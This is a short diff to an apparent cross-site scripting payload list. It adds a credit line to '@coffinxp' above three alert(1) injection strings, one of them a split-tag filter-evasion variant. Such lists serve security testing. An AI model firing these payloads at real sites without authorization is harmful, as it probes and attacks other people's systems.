@@ -1,3 +1,5 @@
+Credits @coffinxp
+
 <script>alert(1)</script>
 <scr ipt>alert(1)</scr ipt>
 "><script>alert(1)</script>
